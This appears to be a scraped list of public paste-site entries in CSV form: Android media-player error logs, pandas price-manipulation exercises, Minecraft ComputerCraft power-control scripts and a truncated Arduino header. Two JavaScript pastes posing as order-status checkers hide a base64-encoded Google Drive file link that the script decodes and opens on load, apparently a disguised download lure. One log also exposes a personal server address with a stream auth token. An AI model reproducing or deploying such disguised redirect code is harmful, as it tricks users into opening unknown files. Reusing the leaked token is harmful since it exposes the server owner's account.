umber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""java.net.SocketTimeoutException: timeout"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":105,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":232,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":317,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2002,""extras"":{""mMap"":{}},""timestampMs"":74244821,""cause"":{""dataSpec"":{""absoluteStreamPosition"":4189246,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://tari.ddns.net:4441/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003debcfc1497ca3ecde1c6a85123eba178f\u0026type\u003dsong\u0026id\u003d778"",""length"":2585099,""position"":4189246,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2002,""cause"":{""bytesTransferred"":0,""cause"":{""detailMessage"":""Socket closed"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":188,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":143,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":994,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":958,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":873,""methodName"":""readUntilDataAvailable""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":846,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.Okio$2"",""fileName"":""Okio.java"",""lineNumber"":138,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":213,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""timeout"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.okio.Okio$3"",""fileName"":""Okio.java"",""lineNumber"":214,""methodName"":""newTimeoutException""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout"",""fileName"":""AsyncTimeout.java"",""lineNumber"":263,""methodName"":""exit""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":217,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""java.net.SocketTimeoutException: timeout"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":105,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":232,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":317,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}]}"
vAZC74Qc,2025-04-17T16:44:07.753023,powerampache,PHP,Thursday 17th of April 2025 03:44:08 PM CDT,"1.01-80-play.debug (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""java.security.cert.CertPathValidatorException: Trust anchor for certification path not found."" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.\"" }"",""stackTrace"":[]}"
6vLkzvEm,Products.js,kammex,JavaScript,Thursday 17th of April 2025 03:39:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91142/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pS36fKn0,B. Сложная подкрутка,Korotkodul,Python,Thursday 17th of April 2025 03:38:35 PM CDT,"import os
from itertools import groupby

import pandas as pd
import kagglehub
import numpy as np


path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))

def double_price(group_data):
    group = group_data.copy()
    group['UnitPrice'] = group['UnitPrice'] * 2
    group['Country'] = group['Country'] + '_bad_times'

    return group


def decrease_price(group_data):
    group = group_data.copy()
    price_mean = group['UnitPrice'].mean()
    price_min = group['UnitPrice'].min()
    group['UnitPrice'] = np.maximum(price_min, group['UnitPrice'] - 0.15 * price_mean)
    group['Country'] = group['Country'] + '_great_times'

    return group


def change_price(group):
    double = double_price(group)
    decrease = decrease_price(group)
    group = pd.concat([double, decrease], axis=0, ignore_index=True)

    return group

def task2(df):
    df = df.groupby(df['Country'], group_keys=False).apply(change_price)

    return df

df = task2(df)
print(df.head())

"
sKQNxPMF,ControlStation.lua,JakobM7,Lua,Thursday 17th of April 2025 03:34:35 PM CDT,"modem = peripheral.wrap(""left"")

modem.open(537) -- channel for receiving data from power Points
modem.open(538) --channel for sending commadns to power Points
timeout = 4 -- seconds to wait for a response from the power point
local updateInterval = 1


local nolimit = math.huge
-- Priority : 5: Highest, 1: Very Low, 0: Shutdown

-- Format : { ""DeviceName"", current Rate, current Limit, Priority, type, optional: storageAmount}
-- type: 0: consumer, 1: producer, 2: storage, 3: none
Devices = {
  {deviceName = ""ME-System"", rate=0, limit=nolimit, priority=5, type=0},
}

--Exptected message format:
-- {pointName, ""getTransferRate""}
-- {pointName, ""getTransferRateLimit""}
-- {pointName, ""setLimit"", limit}

Busy = false

function SetLimit(deviceName, limit)
  Busy = true
  modem.transmit(538, 537, {deviceName, ""setLimit"", limit})
  Busy = false
end

function CheckTransferRate(deviceName)
  Busy = true
  modem.transmit(538, 537, {deviceName, ""getTransferRate""})
  os.startTimer(timeout)
  local event, side, channel, replyChannel, message = os.pullEvent()
  
  if event == ""timer"" then 
    print(""Timeout waiting for transfer rate limit response"")
    return nil
  end

  if event == ""modem_message"" and channel == 537 and type(message) then
    if message[1] == deviceName then
      --print(""Received transfer rate: "" .. message[2])
      Busy = false
      return message[2]
    end
  end
  Busy = false
end

function CheckTransferRateLimit(deviceName)
  Busy = true
  modem.transmit(538, 537, {deviceName, ""getTransferRateLimit""})
  os.startTimer(timeout)
  local event, side, channel, replyChannel, message = os.pullEvent(""modem_message"")
  
  if event == ""timer"" then 
    print(""Timeout waiting for transfer rate limit response"")
    return nil
  end

  if channel == 537 and type(message) then
    if message[1] == deviceName then
      --print(""Received transfer rate: "" .. message[2])
      Busy = false
      return message[2]
    end
  end
  Busy = false
end

function UpdateRates()
  for i = 1, #Devices do
    local deviceName = Devices[i].deviceName
    Devices[i].rate = CheckTransferRate(deviceName)
    Devices[i].limit = CheckTransferRateLimit(deviceName)
  end
  sleep(1)
end
  
function PrintDevices()
  for i = 1, #Devices do
    print(""Device: "" .. Devices[i].deviceName)
    print(""Current Rate: "" .. Devices[i].rate)
    print(""Current Limit: "" .. Devices[i].limit)
    print(""Priority: "" .. Devices[i].priority)
    print(""Type: "" .. Devices[i].type)
    if Devices[i].type == 2 then
      print(""Storage Amount: "" .. Devices[i].storageAmount)
    end
  end
end

function Tick()
  while not Busy do
    UpdateRates()
    term.setCursorPos(1, 0)
    term.clear()
    PrintDevices()
    sleep(updateInterval)
  end
  sleep(0.05)
end

function AskInput()
  print(""Please enter a command:"")
  print(""1. setLimit "")

  local input = io.read()
  if input == ""setLimit"" or ""1"" then
    print(""Enter device name:"")
    local deviceName = io.read()
    print(""Enter new limit:"")
    local limit = tonumber(io.read())
    SetLimit(deviceName, limit)
  else
    print(""Invalid input, please try again."")
  end
end

function keyInterruptWait()
  local event, key, is_held = os.pullEvent(""key"")
  print(""Key pressed: "" .. key)

  while Busy do
    sleep(0.1)
  end

  if event == ""key"" then
    Busy = true
    AskInput()
    Busy = false
  end
  
  while Busy do
    sleep(0.1)
  end
  return true
end






while true do

  parallel.waitForAny(keyInterruptWait, Tick)
end"
k11vCqaL,A. Подкрутка,Korotkodul,Python,Thursday 17th of April 2025 03:30:05 PM CDT,"import os
import pandas as pd
import kagglehub


path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))


def change_price(group):
    first_letter = group.name #A, B, C...

    if first_letter == 'A':
        max_price = group['UnitPrice'].max()
        group['UnitPrice'] = max_price
    elif first_letter == 'B':
        min_price = group['UnitPrice'].min()
        group['UnitPrice'] = group['UnitPrice'] - (min_price / 2)
    else:
        group['UnitPrice'] = group['UnitPrice'] * 1.1

    return group


def task1(df):
    df = df.groupby(df['Country'].str[0], group_keys=False).apply(change_price)
    
    return df

df = task1(df)"
qHubKZtS,Daabases1,Korotkodul,Python,Thursday 17th of April 2025 03:25:50 PM CDT,"# Загрузка датасета с помощью kagglehub
import os
import pandas as pd
import kagglehub

# Загрузка последней версии датасета
path = kagglehub.dataset_download(""ersany/online-retail-dataset"")
print(""Path to dataset files:"", path)

# Чтение Excel-файла
df = pd.read_excel(os.path.join(path, ""Online Retail.xlsx""))
""""""
  InvoiceNo StockCode  ... CustomerID         Country
0    536365    85123A  ...    17850.0  United Kingdom
1    536365     71053  ...    17850.0  United Kingdom
2    536365    84406B  ...    17850.0  United Kingdom
3    536365    84029G  ...    17850.0  United Kingdom
4    536365    84029E  ...    17850.0  United Kingdom

[5 rows x 8 columns]

['InvoiceNo', 'StockCode', 'Description', 'Quantity', 'InvoiceDate', 'UnitPrice', 'CustomerID', 'Country']
""""""

""""""
Изменяем цены
объединить страны в группы по первой букве страны (Australia, Austria; Belgium, Brazil и тд)
В группе с первой буквой ""A"" поднять цену на максимальную цену товарав группе
В группе с первой буквой ""B"" цену уменьшить на половину минимальной
В остальных группах цены увеличить на 10% от текущей цены объекта
""""""
# Полная настройка отображения DataFrame
pd.set_option('display.max_columns', None)  # Все колонки
pd.set_option('display.expand_frame_repr', False)  # Не переносить на новую строку
pd.set_option('display.width', 1000)  # Ширина вывода
pd.set_option('display.max_colwidth', 20)  # Максимальная ширина колонки

#объединить страны в группы по первой букве страны (Australia, Austria; Belgium, Brazil и тд)
print(""RAW"")
print(df.columns.tolist())  # Вывод списка колонок
print(df[:20])
print()


def change_price(group):
    first_letter = group.name #A, B, C...

    if first_letter == 'A':
        max_price = group['UnitPrice'].max()
        group['UnitPrice'] = max_price
    elif first_letter == 'B':
        min_price = group['UnitPrice'].min()
        group['UnitPrice'] = group['UnitPrice'] - (min_price / 2)
    else:
        group['UnitPrice'] = group['UnitPrice'] * 1.1

    return group


def task1(df):
    df = df.groupby( df['Country'].str[0], group_keys=False).apply(change_price)
    return df

df = task1(df)
print(""AFTER"")
print(df[:20])
print(df[-20:])"
uvq0nV56,Order.js,kammex,JavaScript,Thursday 17th of April 2025 03:24:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25136/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hacL1gR7,PowerPoint.lua,JakobM7,Lua,Thursday 17th of April 2025 03:22:33 PM CDT,"-- Script to control get data from a energy Detector in minecraft and output it to a control station over a wireless modem

-- This script is designed to be run on a computer in the game Minecraft, using the ComputerCraft mod.

local pwr = peripheral.wrap(""bottom"")
local modem = peripheral.wrap(""right"")
local pointName = os.getComputerLabel()
local energyStorage = false
if energyStorage then 
  energyCube = peripheral.wrap(""advancedEnergyCube_0"") 
end 


modem.open(537) -- channel for sending data to control station
modem.open(538) --channel for receiving commadns


function setLimit(limit)
    pwr.setTransferRateLimit(limit)
end

function checkTransferRate()
    local currentRate = pwr.getTransferRate()
    return currentRate
end

function checkTransferRateLimit()
    local currentLimit = pwr.getTransferRateLimit()
    return currentLimit
end

function getEnergy()
    if energyStorage then 
        return energyCube.getEnergy()
    else
        return 0
    end
end

function getMaxEnergy()
    if energyStorage then 
        return energyCube.getMaxEnergy()
    else
        return 0
    end
end


--Exptected message format:
-- {pointName, ""getTransferRate""}
-- {pointName, ""getTransferRateLimit""}
-- {pointName, ""setLimit"", limit}
-- {pointName, ""getEnergy""}
-- {pointName, ""getMaxEnergy""}

while true do
    -- check for messages from the control station
    local event, side, channel, replyChannel, message = os.pullEvent(""modem_message"")

    if channel == 538 and type(message) and message[1] == pointName then

      --getTransferRate
      if message[2] == ""getTransferRate""  then
        local currentRate = checkTransferRate()
        modem.transmit(537, 0, {pointName, currentRate})
        print(""Sending transfer rate: "" .. currentRate)

      --getTransferRateLimit
      elseif message[2] == ""getTransferRateLimit""  then
        local currentLimit = checkTransferRateLimit()
        modem.transmit(537, 0, {pointName, currentLimit})
        print(""Sending transfer rate limit: "" .. currentLimit)

      --setLimit
      elseif message[2] == ""setLimit""  then
        local limit = tonumber(message[3])
        if limit then
          setLimit(limit)
          modem.transmit(537, 0, {pointName, limit})
        else
          modem.transmit(537, 0, {pointName, ""400""})
        end

      --getEnergy
      elseif message[2] == ""getEnergy"" then
        local energy = getEnergy()
        modem.transmit(537, 0, {pointName, energy})
        print(""Sending current energy storage: "" .. energy)

      elseif message[2] == ""getMaxEnergy"" then
        local maxEnergy = getMaxEnergy()
        modem.transmit(537, 0, {pointName, maxEnergy})
        print(""Sending max energy storage: "" .. maxEnergy)
      
      end

    end

end
"
wvx7PRNT,**IR Control** rev_01,pleasedontcode,Arduino,Thursday 17th of April 2025 03:02:27 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **IR Control**
